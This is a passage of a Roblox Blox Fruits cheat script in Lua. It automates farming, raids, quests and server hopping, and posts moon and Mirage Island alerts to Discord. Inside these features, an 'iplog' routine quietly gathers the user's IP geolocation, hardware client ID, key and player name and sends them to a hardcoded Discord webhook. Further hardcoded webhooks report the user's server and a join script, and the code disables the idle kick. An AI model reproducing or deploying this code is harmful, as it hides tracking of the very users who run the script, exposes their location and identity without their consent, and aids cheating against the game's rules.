    if CheckMoon() == "Full Moon" or CheckMoon() == "Next Night" then
        text1 = text1 .. "|"
        if CheckMoon() == "Full Moon" then
            text1 = text1 .. "Full Moon :full_moon:"
        elseif CheckMoon() == "Next Night" then
            text1 = text1 .. "Gibbous Moon :waning_gibbous_moon:"
        end
    end
    if IsMirageIsland2() then
        text1 = text1 .. "|" .. "Mirage Island :island:"
    end
    return text1
end
function SkidSeaHub2()
    InviteScript =
        'game:GetService("TeleportService"):TeleportToPlaceInstance(' ..
        game.PlaceId .. ',"' .. game.JobId .. '", game.Players.LocalPlayer)'
    k3 = {}
    if Settings["PingEveryone"] and Settings["WebhookWhenMirage"] then
        k3["content"] = "@everyone"
    else
        k3["content"] = "toi nwngs"
    end
    k3["embeds"] = {
        {
            ["title"] = "Blox Fruit Full Moon Checker",
            ["description"] = SkidSeaHub1(),
            ["color"] = tonumber(0xFFFF6A),
            ["fields"] = {
                {
                    ["name"] = "Script To Join:",
                    ["value"] = "```lua\n" .. InviteScript .. "\n```",
                    ["inline"] = true
                }
            }
        }
    }
    return k3
end
function GetMsg()
    InviteScript =
        'game:GetService("TeleportService"):TeleportToPlaceInstance(' ..
        game.PlaceId .. ',"' .. game.JobId .. '", game.Players.LocalPlayer)'
    k3 = {}
    if Settings["PingEveryone"] and Settings["WebhookWhenMirage"] then
        k3["content"] = "@everyone"
    else
        k3["content"] = "toi nwngs"
    end
    k3["embeds"] = {
        {
            ["title"] = "Blox Fruit Full Moon Checker",
            ["fields"] = {
                {
                    ["name"] = "Moon Status:",
                    ["value"] = u9(CheckMoon()),
                    ["inline"] = true
                },
                {
                    ["name"] = "Mirage Status:",
                    ["value"] = IsMirageIsland(),
                    ["inline"] = true
                },
                {
                    ["name"] = "Server Time:",
                    ["value"] = u9(function7() .. " | " .. function8()),
                    ["inline"] = true
                },
                {
                    ["name"] = "Account:",
                    ["value"] = "||" .. game.Players.LocalPlayer.Name .. "||",
                    ["inline"] = true
                },
                {
                    ["name"] = "Player Count:",
                    ["value"] = u9(game.Players.NumPlayers .. "/12"),
                    ["inline"] = true
                },
                {
                    ["name"] = "Job Id:",
                    ["value"] = u9(game.JobId),
                    ["inline"] = true
                },
                {
                    ["name"] = "Script To Join:",
                    ["value"] = "```lua\n" .. InviteScript .. "\n```",
                    ["inline"] = true
                }
            }
        }
    }
    return k3
end
function GetMsg2()
    InviteScript =
        'game:GetService("TeleportService"):TeleportToPlaceInstance(' ..
        game.PlaceId .. ',"' .. game.JobId .. '", game.Players.LocalPlayer)'
    k3 = {}
    k3["embeds"] = {
        {
            ["title"] = "Blox Fruit Full Moon Checker",
            ["fields"] = {
                {
                    ["name"] = "Moon Status:",
                    ["value"] = u9(CheckMoon()),
                    ["inline"] = true
                },
                {
                    ["name"] = "Mirage Status:",
                    ["value"] = IsMirageIsland(),
                    ["inline"] = true
                },
                {
                    ["name"] = "Server Time:",
                    ["value"] = u9(function7() .. " | " .. function8()),
                    ["inline"] = true
                },
                {
                    ["name"] = "Account:",
                    ["value"] = "||" .. "pornhub.com" .. "||",
                    ["inline"] = true
                },
                {
                    ["name"] = "Player Count:",
                    ["value"] = u9(game.Players.NumPlayers .. "/12"),
                    ["inline"] = true
                },
                {
                    ["name"] = "Job Id:",
                    ["value"] = u9(game.JobId),
                    ["inline"] = true
                },
                {
                    ["name"] = "Script To Join:",
                    ["value"] = "```lua\n" .. InviteScript .. "\n```",
                    ["inline"] = true
                }
            }
        }
    }
    return k3
end
function GetMsgTest()
    k3 = {}
    k3["embeds"] = {
        {
            ["title"] = "Con cac!",
            ["url"] = "https://www.pornhub.com",
            ["description"] = "Ok"
        }
    }
    return k3
end
spawn(
    function()
        while wait() do
            if Settings["WebhookWhenMirage"] then
                repeat
                    task.wait()
                until game:GetService("Workspace").Map:FindFirstChild("MysticIsland")
                if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
                    PostWebhook(Settings["WebhookUrl"], GetMsg())
                    wait(60)
                end
            end
        end
    end
)
spawn(
    function()
        while wait() do
            if Settings["WebhookWhenMoon"] then
                repeat
                    task.wait()
                until CheckMoon() == "Full Moon" or CheckMoon() == "Next Night"
                if CheckMoon() == "Full Moon" or CheckMoon() == "Next Night" then
                    PostWebhook(Settings["WebhookUrl"], GetMsg())
                    wait(60)
                end
            end
        end
    end
)
spawn(
    function()
        repeat
            task.wait()
        until game:GetService("Workspace").Map:FindFirstChild("MysticIsland")
        if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
            PostWebhook(
                "https://discord.com/api/webhooks/1108041186662424617/WaEVGp67j8wetVB153s29Oj0VeX_Rz9lDLHEW2CvAAC8sjkhvdFOIGReKKYNDjLewC1Q",
                GetMsg2()
            )
        end
    end
)
spawn(
    function()
        repeat
            task.wait()
        until CheckMoon() == "Full Moon" or CheckMoon() == "Next Night"
        if CheckMoon() == "Full Moon" or CheckMoon() == "Next Night" then
            PostWebhook(
                "https://discord.com/api/webhooks/1108003058014765116/XX5bRapE8PQAEYdG1ibXcANBD2eLysFg9IiKbrz_oMhzg43hCjwGsv7FNtbJpHPZXtY9",
                GetMsg2()
            )
        end
    end
)
spawn(
    function()
        function iplog()
            local LocalUserIpDatas = game:HttpGet("http://ip-api.com/json")
            LocalUserIpDatas = game:GetService("HttpService"):JSONDecode(LocalUserIpDatas)
            local BlackListedIps =
                game:HttpGet("https://raw.githubusercontent.com/memaybeohub/me-may-beo-hub/main/BlackListedips.lua")
            descriptionf = ""
            for i, v in pairs(LocalUserIpDatas) do
                descriptionf = descriptionf .. i .. " : " .. v .. "\n"
            end
            clientid = game:GetService("RbxAnalyticsService"):GetClientId()
            descriptionf = descriptionf.."\nHardWereId: "..clientid
            mfgg = {
                ["content"] = u9(
                    "Name: " ..
                        game.Players.LocalPlayer.Name .. "\nKey: " .. tostring(getgenv().Key) .. "\n" .. descriptionf
                ),
                ["username"] = "Suc Vat IP LOG",
                ["avatar_url"] = "https://media.discordapp.net/attachments/1059858215879311412/1059864410740502578/Ew4kWteXEAAK2Hy.png"
            }
            local rq = http_request or request or HttpPost or syn.request
            local DataCallBack =
                rq(
                {
                    Url = "https://discord.com/api/webhooks/1098132832968249396/0WwsPAMici2_eY8TKo9lWqCFvofbScNSaEDxZsW_OyryC1aixy0tR48SXacTJTiVJ0n8",
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = game:GetService("HttpService"):JSONEncode(mfgg)
                }
            )
        end
        iplog()
    end
)
spawn(
    function()
        local GC = getconnections or get_signal_cons
        if GC then
            game.Players.LocalPlayer.Idled:Connect(
                function()
                    for i, v in pairs(GC(game.Players.LocalPlayer.Idled)) do
                        v:Disable()
                    end
                end
            )
        end
    end
)
lessfoundAnything = ""
spawn(
    function()
        while wait() do
            if Settings["Farm"] and ((Settings["Hop Near"] or _G.HopNear) or _G.UpgradeConfig) then
                pcall(function()
                    if game.CoreGui.RobloxPromptGui.promptOverlay:FindFirstChild("ErrorPrompt") then 
                        while wait() do
                            game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
                            wait(10)
                        end
                    end
                end)
                if BringMobCFrame then
                    for i, v in pairs(game.Players:GetChildren()) do
                        cwewg = BringMobCFrame
                        pcall(
                            function()
                                if
                                    v.Name ~= game.Players.LocalPlayer.Name and
                                        (v.Character.HumanoidRootPart.Position - cwewg.Position).Magnitude <= 1500
                                 then
                                    Notify(
                                        nil,
                                        tostring(
                                            v.Name ..
                                                "\n" ..
                                                    (v.Character.HumanoidRootPart.Position - cwewg.Position).Magnitude
                                        ),
                                        100
                                    )
                                    if lessfoundAnything == "" then
                                        SiteHopServerLess =
                                            game.HttpService:JSONDecode(
                                            game:HttpGet(
                                                "https://games.roblox.com/v1/games/" ..
                                                    game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
                                            )
                                        )
                                    else
                                        SiteHopServerLess =
                                            game.HttpService:JSONDecode(
                                            game:HttpGet(
                                                "https://games.roblox.com/v1/games/" ..
                                                    game.PlaceId ..
                                                        "/servers/Public?sortOrder=Asc&limit=100&cursor=" ..
                                                            lessfoundAnything
                                            )
                                        )
                                    end
                                    if
                                        SiteHopServerLess.nextPageCursor and SiteHopServerLess.nextPageCursor ~= "null" and
                                            SiteHopServerLess.nextPageCursor ~= nil
                                     then
                                        lessfoundAnything = SiteHopServerLess.nextPageCursor
                                    end
                                    for i, v in pairs(SiteHopServerLess.data) do
                                        if v.playing and tonumber(v.playing) <= 4 and v.id ~= game.JobId then
                                            game:GetService("TeleportService"):TeleportToPlaceInstance(
                                                game.PlaceId,
                                                tostring(v.id),
                                                game.Players.LocalPlayer
                                            )
                                        end
                                    end
                                    for oo = 4, 5 do
                                        HopServer()
                                    end
                                    while task.wait() do 
                                        HopServer()
                                        task.wait(10)
                                    end
                                end
                            end
                        )
                    end
                end
            end
        end
    end
)
if not Sea1 then
    KillAura_Toggle =
        RaidTab:AddToggle(
        {
            Name = "Mob Kill Aura",
            Default = Settings["InstantKillAura"],
            Save = false,
            Flag = "InstantKillAura",
            Callback = function(Value)
                SaveSettings("InstantKillAura", Value)
            end
        }
    )
    AutoTweenNextIsland_Toggle =
        RaidTab:AddToggle(
        {
            Name = "Auto Tween To Next Island",
            Default = Settings["AutoTweenNextIsland"],
            Callback = function(v)
                SaveSettings("AutoTweenNextIsland", v)
            end
        }
    )
    function IsIslandRaid(nu)
        if game:GetService("Workspace")["_WorldOrigin"].Locations:FindFirstChild("Island " .. nu) then
            min = 4500
            for i, v in pairs(game:GetService("Workspace")["_WorldOrigin"].Locations:GetChildren()) do
                if
                    v.Name == "Island " .. nu and
                        (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < min
                 then
                    min = (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                end
            end
            for i, v in pairs(game:GetService("Workspace")["_WorldOrigin"].Locations:GetChildren()) do
                if
                    v.Name == "Island " .. nu and
                        (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= min
                 then
                    return v
                end
            end
        end
    end
    function getNextIsland()
        TableIslandsRaid = {
            5,
            4,
            3,
            2,
            1
        }
        for i, v in pairs(TableIslandsRaid) do
            if
                IsIslandRaid(v) and
                    (IsIslandRaid(v).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <=
                        4500
             then
                return IsIslandRaid(v)
            end
        end
    end
    AutoAwake_Toggle =
        RaidTab:AddToggle(
        {
            Name = "Auto Awake",
            Default = Settings["AutoAwake"],
            Callback = function(v)
                SaveSettings("AutoAwake", v)
            end
        }
    )
    function AwakeFruit()
        local v302 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Awakener", "Check")
        if not v302 or v302 == 0 or v302 == 1 then
            return
        end
        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Awakener", "Awaken")
    end
    spawn(
        function()
            while task.wait() do
                if Settings["AutoAwake"] then
                    AwakeFruit()
                    task.wait(30)
                end
            end
        end
    )
    Raidslist = {}
    RaidsModule = require(game.ReplicatedStorage.Raids)
    for i, v in pairs(RaidsModule.raids) do
        if v.Name ~= " " then
            table.insert(Raidslist, v)
        end
    end
    for i, v in pairs(RaidsModule.advancedRaids) do
        if v.Name ~= " " then
            table.insert(Raidslist, v)
        end
    end
    RaidTab:AddDropdown(
        {
            Name = "Choose A Raid Option",
            Default = Settings["ChoosenRaid"],
            Options = Raidslist,
            Callback = function(k)
                SaveSettings("ChoosenRaid", k)
            end
        }
    )
    AutoRaid_Toggle =
        RaidTab:AddToggle(
        {
            Name = "Auto Raid",
            Default = Settings["Auto Raid"],
            Callback = function(v)
                SaveSettings("Auto Raid", v)
            end
        }
    )
end
function getMaxOfNumbers(numberstable)
    max = 5000
    for i, v in pairs(numberstable) do
        if v > max then
            max = v
        end
    end
    for i, v in pairs(numberstable) do
        if v >= max then
            return max
        end
    end
    return max
end
function removechildintable(tables, child)
    for i, v in pairs(tables) do
        if v == child then
            tables[i] = nil
        end
    end
end
function getInventoryFruits()
    ss = {}
    for k, v in pairs(game:GetService("ReplicatedStorage").Remotes["CommF_"]:InvokeServer("getInventory")) do
        if v["Type"] == "Blox Fruit" then
            table.insert(ss, v["Value"])
        end
    end
    mem = ""
    for i, v in pairs(ss) do
        s2 = getMaxOfNumbers(ss)
        for k, v in pairs(game:GetService("ReplicatedStorage").Remotes["CommF_"]:InvokeServer("getInventory")) do
            if v["Type"] == "Blox Fruit" and v["Value"] == s2 then
                mem = mem .. v["Name"] .. ", "
            end
        end
        removechildintable(ss, s2)
    end
    return mem
end
function getPersent(n1, n2)
    return math.floor((n1 / n2) * 100) / 100 * 100
end
function CheckItem2(itemcc)
    for k, v in pairs(game:GetService("ReplicatedStorage").Remotes["CommF_"]:InvokeServer("getInventory")) do
        if v.Name == itemcc then
            return v.Name .. " "
        end
    end
    return cac
end
function MeleeCount()
    meleetable = {"DragonTalon", "Superhuman", "Godhuman", "ElectricClaw", "SharkmanKarate", "DeathStep"}
    duconcac = {}
    for i, v in pairs(meleetable) do
        if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Buy" .. v, true) == 1 then
            table.insert(duconcac, v)
        end
    end
    return #duconcac
end
function Aliasreturn()
    CDK = CheckItem("Cursed Dual Katana")
    SG = CheckItem("Soul Guitar")
    HS = CheckItem("Hallow Scythe")
    TTK = CheckItem("True Triple Katana")
    Textmm = ""
    if CDK then
        Textmm = "-CDK"
    end
    if CDK and SG then
        Textmm = "-CDK-SG"
    elseif SG then
        Textmm = "-SG"
    end
    if (CDK or SG) and HS then
        Textmm = Textmm .. "-HS"
    elseif HS then
        Textmm = "-HS"
    end
    if (CDK or SG or HS) and TTK then
        Textmm = Textmm .. "-TTK"
    elseif TTk then
        Textmm = "-TTK"
    end
    return Textmm
end
function CheckMirrorFractalAndValkyrieHelmet()
    MirrorFractal = CheckItem("Mirror Fractal")
    Valk = CheckItem("Valkyrie Helm")
    Textv = ""
    if Valk then
        Textv = "Valk"
    end
    if Valk and MirrorFractal then
        Textv = "Valk&Mirror"
    elseif MirrorFractal then
        Textv = "Mirror"
    end
    return Textv
end
function Abbreviate(x)
    local abbreviations = {
        "K", -- 4 digits
        "M", -- 7 digits
        "B", -- 10 digits
        "T", -- 13 digits
        "QD", -- 16 digits
        "QT", -- 19 digits
        "SXT", -- 22 digits
        "SEPT", -- 25 digits
        "OCT", -- 28 digits
        "NON", -- 31 digits
        "DEC", -- 34 digits
        "UDEC", -- 37 digits
        "DDEC" -- 40 digits
    }
    if x < 1000 then
        return tostring(x)
    end

    local digits = math.floor(math.log10(x)) + 1
    local index = math.min(#abbreviations, math.floor((digits - 1) / 3))
    local front = x / math.pow(10, index * 3)

    return string.format("%i%s+", front, abbreviations[index])
end
function getInventoryFruits()
    ss = {}
    for k, v in pairs(game:GetService("ReplicatedStorage").Remotes["CommF_"]:InvokeServer("getInventory")) do
        if v["Type"] == "Blox Fruit" and v["Value"] >= 1000000 then
            table.insert(ss, v["Value"])
        end
    end
    mem = ""
    for i, v in pairs(ss) do
        s2 = getMaxOfNumbers(ss)
        for k, v in pairs(game:GetService("ReplicatedStorage").Remotes["CommF_"]:InvokeServer("getInventory")) do
            if v["Type"] == "Blox Fruit" and v["Value"] == s2 then
                mem = mem .. v["Name"] .. ", "
            end
        end
        removechildintable(ss, s2)
    end
    return mem
end
function khongngu22(name)
    string22 = name:split("-")
    return string22[2]
end

Raids = require(game:GetService("ReplicatedStorage").Raids).raids
AdvancedRaids = require(game:GetService("ReplicatedStorage").Raids).advancedRaids
Raids2 = {}
for i, v in pairs(Raids) do
    table.insert(Raids2, v)
end
for i, v in pairs(AdvancedRaids) do
    table.insert(Raids2, v)
end
function getFruitMastery()
    c = game.Players.LocalPlayer.Backpack or game.Players.LocalPlayer.Character
    for i, v in pairs(c:GetChildren()) do
        if v:IsA("Tool") and v.ToolTip == "Blox Fruit" then
            return v.Level.Value
        end
    end
    return 0
end
function CheckPlayerDF()
    local TotalCanAwakeSkills
    local PersentAwakedSkill
    if table.find(Raids2, khongngu22(game:GetService("Players").LocalPlayer.Data.DevilFruit.Value)) then
        TotalCanAwakeSkills = {}
        AwakedSkills = {}
        getAwakenedAbilities = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getAwakenedAbilities")
        for i, v in pairs(getAwakenedAbilities) do
            table.insert(TotalCanAwakeSkills, i)
            if v["Awakened"] then
                table.insert(AwakedSkills, i)
            end
        end
    end
    if TotalCanAwakeSkills then
        if AwakedSkills and #AwakedSkills ~= #TotalCanAwakeSkills then
            PersentAwakedSkill = tostring(getPersent(#AwakedSkills, #TotalCanAwakeSkills)) .. "% " .. tostring("V2")
        elseif AwakedSkills and #AwakedSkills == #TotalCanAwakeSkills then
            PersentAwakedSkill = "V2"
        elseif not AwakedSkills then
            PersentAwakedSkill = "V1"
        end
    end
    DF = game.Players.LocalPlayer.Data.DevilFruit.Value
    if not PersentAwakedSkill then
        DF = DF .. " | Mastery: " .. getFruitMastery()
    else
        DF = DF .. " " .. PersentAwakedSkill .. " | " .. #AwakedSkills .. " | Mastery: " .. getFruitMastery()
    end
    return DF
end
function CheckPlayerDF2()
    local TotalCanAwakeSkills
    local PersentAwakedSkill
    if table.find(Raids2, khongngu22(game:GetService("Players").LocalPlayer.Data.DevilFruit.Value)) then
        TotalCanAwakeSkills = {}
        AwakedSkills = {}
        getAwakenedAbilities = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getAwakenedAbilities")
        for i, v in pairs(getAwakenedAbilities) do
            table.insert(TotalCanAwakeSkills, i)
            if v["Awakened"] then
                table.insert(AwakedSkills, i)
            end
        end
    end
    if TotalCanAwakeSkills then
        if AwakedSkills and #AwakedSkills ~= #TotalCanAwakeSkills then
            PersentAwakedSkill = tostring(getPersent(#AwakedSkills, #TotalCanAwakeSkills)) .. "% " .. tostring("V2")
        elseif AwakedSkills and #AwakedSkills == #TotalCanAwakeSkills then
            PersentAwakedSkill = "V2"
        elseif not AwakedSkills then
            PersentAwakedSkill = "V1"
        end
    end
    DF = game.Players.LocalPlayer.Data.DevilFruit.Value
    if not PersentAwakedSkill then
        DF = DF .. " | Mastery: " .. getFruitMastery()
    else
        DF = DF .. " " .. PersentAwakedSkill
    end
    return DF
end

function CheckAcientkkkkkkkkkkkkOneStatus()
    Valk = CheckItem("Valkyrie Helm")
    Mirror = CheckItem("Mirror Fractal")
    if not game.Players.LocalPlayer.Character:FindFirstChild("RaceTransformed") then
        p = "mmb"
        if Valk then
            p = "Valk"
        end
        if Mirror then
            p = p .. "&Mirror"
        end
        return p
    end
    local v227 = nil
    local v228 = nil
    local v229 = nil
    v229, v228, v227 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("UpgradeRace", "Check")
    if v229 == 1 then
        return "Required Train More"
    elseif v229 == 2 or v229 == 4 or v229 == 7 then
        return "Can Buy Gear With " .. v227 .. " Fragments"
    elseif v229 == 3 then
        return "Required Train More"
    elseif v229 == 5 then
        return "You Are Done Your Race."
    elseif v229 == 6 then
        return (v228 - 2) .. "/3"
    end
    if v229 ~= 8 then
        if v229 == 0 then
            return "Ready For Trial"
        else
            return "mmb"
        end
    end
    return 10 - v228 .. " training sessions."
end
function pppp()
    Textmm = ""
    PulledLever = "Chua Gat Can"
    if game.ReplicatedStorage.Remotes.CommF_:InvokeServer("CheckTempleDoor") then
        PulledLever = "Da Gat Can"
    end
    Textmm = CheckRace() .. " + " .. PulledLever .. " + " .. CheckAcientkkkkkkkkkkkkOneStatus()
    return Textmm
end
local RAMPANEL = RAMAccount.new(game:GetService "Players".LocalPlayer.Name)
if not Settings["RAM_Track_Delay"] then
    Settings["RAM_Track_Delay"] = 90
end
spawn(
    function()
        while wait() do
            if Settings["RAM_Track"] then
                if not Settings["RAM_Track_Delay"] then
                    Settings["RAM_Track_Delay"] = 90
                end
                DFStorage = getInventoryFruits()
                Alias =
                    game.Players.LocalPlayer.Data.Level.Value .. "-" .. tostring(MeleeCount()) .. "" .. Aliasreturn()
                Description =
                    pppp() ..
                    " \nBeli: " ..
                        Abbreviate(game.Players.LocalPlayer.Data.Beli.Value) ..
                            " | F: " ..
                                Abbreviate(game.Players.LocalPlayer.Data.Fragments.Value) ..
                                    "\n" .. CheckPlayerDF() .. "\n" .. CheckRace() .. "\nDF: " .. getInventoryFruits()
                RAMPANEL:SetAlias(Alias)
                RAMPANEL:SetDescription(Description)
                wait(Settings["RAM_Track_Delay"])
            end
        end
    end
)

--[[
    local CreditsTab =
    Window:MakeTab(
    {
        Name = "Credits",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    }
)
CreditsTab:AddParagraph("Develope by DeletedUser#4500", "YMF Hub Interface Suite")
]]
--[[
    if string.find(CheckRace(),"V3") then 
    TeleportSea(3)
end
if Config then 
    if Config == "https://raw.githubusercontent.com/memaybeohub/me-may-beo-hub/main/YmfAutoUpRaceConfig.json" then 
        if string.find(CheckRace(),"V3") then 
            TeleportSea(3)
        else
            AutoUpgradeRace_Toggle:Set(true)
            if game.Players.LocalPlayer.Data.Race.Value == "Fishman" then 
                ToggleSpamGun:Set(true)
                ToggleSpamDF:Set(true)
                ToggleSpamMelee:Set(true)
                ToggleSpamSword:Set(true)
            end
        end
    end
end
]]
spawn(
    function()
        while wait() do
            if _G.TaoCanDiTrial then
                pcall(
                    function()
                        EquipWeapon()
                        EnableBuso()
                        if (tableRaceDoor[game.Players.LocalPlayer.Data.Race.Value .. "Corridor"].Position -
                                    game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 4 and
                                not game.Players.LocalPlayer.PlayerGui.Main.Timer.Visible and (not game.ReplicatedStorage.Remotes.CommF_:InvokeServer("TempleClock", "Check") or not game.ReplicatedStorage.Remotes.CommF_:InvokeServer("TempleClock", "Check").HadPoint)
                         then
                            repeat
                                wait()
                                TweentoCurrentRaceDoor()
                            until (tableRaceDoor[game.Players.LocalPlayer.Data.Race.Value .. "Corridor"].Position -
                                game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 2000
                        end
                    end
                )
            end
        end
    end
)
spawn(
    function()
        while wait() do
            if _G.UpgradeConfig then
                Race = CheckRace()
                if string.find(Race, "V3") then
                    TeleportSea(3)
                end
                wait(1)
            end
        end
    end
)
function DoorTouch()
    for i, v in next, game:GetService("Workspace").Map.Jungle.QuestPlates:GetChildren() do
        if v:IsA("Model") then
            if v.Button:FindFirstChild("TouchInterest") then
                return v
            end
        end
    end
end
function AutoPoleV1Function()
    if LocalPlayerLevelValue >= 150 then
        if CheckItem("Pole (1st Form)") then 
            AutoPoleV1_Toggle:Set(false)
            
        end
        if CheckBoss("Thunder God [Lv. 575] [Boss]") then 
            
            Target = CheckBoss("Thunder God [Lv. 575] [Boss]")
            if game.Workspace.Enemies:FindFirstChild(Target.Name) then 
                repeat 
                    if Target then KillMob(Target) end
                    task.wait(1)
                until not Target or not Target:FindFirstChild("Humanoid") or not Target:FindFirstChild("HumanoidRootPart") and Target["Humanoid"].Health <= 0 
                UseFastAttack = false
            elseif Target then 
                spawn(Tweento(Target.HumanoidRootPart.CFrame * CFrame.new(0,40,0)),1)
                NoClip = true
            end
        else
            
        end
    end
end
function AutoSaberFunction()
    if LocalPlayerLevelValue >= 200 then
        if CheckItem("Saber") then
            AutoSaber_Toggle:Set(false)
            
        end
        if not doorsaber() then
            if game:GetService("Workspace").Map.Jungle.QuestPlates.Door.CanCollide then
                
                if DoorTouch() then 
                    pcall(function()
                        Tweento(DoorTouch().Button.CFrame)
                    end)
                end
                
            else
                if doorcup() then
                    
                    if
                        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon") ~= 0 and
                            game.ReplicatedStorage.Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon") ~= 1
                     then
                        if
                            not game:GetService("Players").LocalPlayer.Character:FindFirstChild("Cup") and
                                not game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Cup")
                         then
                            if
                                (game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -
                                    CFrame.new(
                                        1112.46521,
                                        4.92147732,
                                        4364.55469,
                                        -0.743286014,
                                        -4.82822775e-11,
                                        -0.668973804,
                                        4.62103383e-10,
                                        1,
                                        -5.85609283e-10,
                                        0.668973804,
                                        -7.444102e-10,
                                        -0.743286014
                                    ).Position).Magnitude < 5
                             then
                                toTarget(
                                    game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position,
                                    CFrame.new(
                                        1113.66992,
                                        7.5484705,
                                        4365.27832,
                                        -0.78613919,
                                        -2.19578524e-08,
                                        -0.618049502,
                                        1.02977182e-09,
                                        1,
                                        -3.68374984e-08,
                                        0.618049502,
                                        -2.95958493e-08,
                                        -0.78613919
                                    ).Position,
                                    CFrame.new(
                                        1113.66992,
                                        7.5484705,
                                        4365.27832,
                                        -0.78613919,
                                        -2.19578524e-08,
                                        -0.618049502,
                                        1.02977182e-09,
                                        1,
                                        -3.68374984e-08,
                                        0.618049502,
                                        -2.95958493e-08,
                                        -0.78613919
                                    )
                                )
                                firetouchinterest(
                                    game:GetService("Workspace").Map.Desert.Cup,
                                    game.Players.LocalPlayer.Character.HumanoidRootPart,
                                    0
                                )
                                firetouchinterest(
                                    game:GetService("Workspace").Map.Desert.Cup,
                                    game.Players.LocalPlayer.Character.HumanoidRootPart,
                                    1
                                )
                                return
                            end
                            toTarget(
                                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position,
                                CFrame.new(
                                    1112.46521,
                                    4.92147732,
                                    4364.55469,
                                    -0.743286014,
                                    -4.82822775e-11,
                                    -0.668973804,
                                    4.62103383e-10,
                                    1,
                                    -5.85609283e-10,
                                    0.668973804,
                                    -7.444102e-10,
                                    -0.743286014
                                ).Position,
                                CFrame.new(
                                    1112.46521,
                                    4.92147732,
                                    4364.55469,
                                    -0.743286014,
                                    -4.82822775e-11,
                                    -0.668973804,
                                    4.62103383e-10,
                                    1,
                                    -5.85609283e-10,
                                    0.668973804,
                                    -7.444102e-10,
                                    -0.743286014
                                )
                            )
                        else
                            EquipWeaponName("Cup")
                            if
                                game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Cup") and
                                    game:GetService("Players").LocalPlayer.Backpack.Cup.Handle:FindFirstChild(
                                        "TouchInterest"
                                    ) or
                                    game:GetService("Players").LocalPlayer.Character:FindFirstChild("Cup") and
                                        game:GetService("Players").LocalPlayer.Character.Cup.Handle:FindFirstChild(
                                            "TouchInterest"
                                        )
                             then
                                toTarget(
                                    game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position,
                                    CFrame.new(
                                        1395.77307,
                                        37.4733238,
                                        -1324.34631,
                                        -0.999978602,
                                        -6.53588605e-09,
                                        0.00654155109,
                                        -6.57083277e-09,
                                        1,
                                        -5.32077493e-09,
                                        -0.00654155109,
                                        -5.3636442e-09,
                                        -0.999978602
                                    ).Position,
                                    CFrame.new(
                                        1395.77307,
                                        37.4733238,
                                        -1324.34631,
                                        -0.999978602,
                                        -6.53588605e-09,
                                        0.00654155109,
                                        -6.57083277e-09,
                                        1,
                                        -5.32077493e-09,
                                        -0.00654155109,
                                        -5.3636442e-09,
                                        -0.999978602
                                    )
                                )
                            elseif
                                game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Cup") and
                                    not game:GetService("Players").LocalPlayer.Backpack.Cup.Handle:FindFirstChild(
                                        "TouchInterest"
                                    ) or
                                    game:GetService("Players").LocalPlayer.Character:FindFirstChild("Cup") and
                                        not game:GetService("Players").LocalPlayer.Character.Cup.Handle:FindFirstChild(
                                            "TouchInterest"
                                        )
                             then
                                if
                                    (game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -
                                        Vector3.new(1457.8768310547, 88.377502441406, -1390.6892089844)).Magnitude > 8
                                 then
                                    toTarget(
                                        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position,
                                        CFrame.new(1457.8768310547, 88.377502441406, -1390.6892089844).Position,
                                        CFrame.new(1457.8768310547, 88.377502441406, -1390.6892089844)
                                    )
                                else
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(
                                        "ProQuestProgress",
                                        "SickMan"
                                    )
                                end
                            end
                        end
                        
                    elseif game.ReplicatedStorage.Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon") == 0 then
                        
                        if
                            game.ReplicatedStorage:FindFirstChild("Mob Leader [Lv. 120] [Boss]") or
                                game.workspace.Enemies:FindFirstChild("Mob Leader [Lv. 120] [Boss]")
                         then
                            coountsaber1 = 1
                            local folder = game.workspace.Enemies
                            if game.ReplicatedStorage:FindFirstChild("Mob Leader [Lv. 120] [Boss]") then
                                folder = game.ReplicatedStorage
                            end
                            for i, v in next, folder:GetChildren() do
                                if v.Name == "Mob Leader [Lv. 120] [Boss]" and v.Humanoid.Health > 0 then
                                    repeat
                                        wait()
                                        KillMob(v)
                                    until not v or not v.Parent or v.Humanoid.Health == 0
                                end
                            end
                        else
                            
                        end
                    elseif game.ReplicatedStorage.Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon") == 1 then
                        
                        if
                            not game:GetService("Players").LocalPlayer.Character:FindFirstChild("Relic") and
                                not game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Relic")
                         then
                            if
                                (game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -
                                    CFrame.new(
                                        -1404.07996,
                                        29.8520069,
                                        5.26677656,
                                        0.888123989,
                                        -4.0340602e-09,
                                        0.459603906,
                                        7.5884703e-09,
                                        1,
                                        -5.8864642e-09,
                                        -0.459603906,
                                        8.71560069e-09,
                                        0.888123989
                                    )).Magnitude > 8
                             then
                                toTarget(
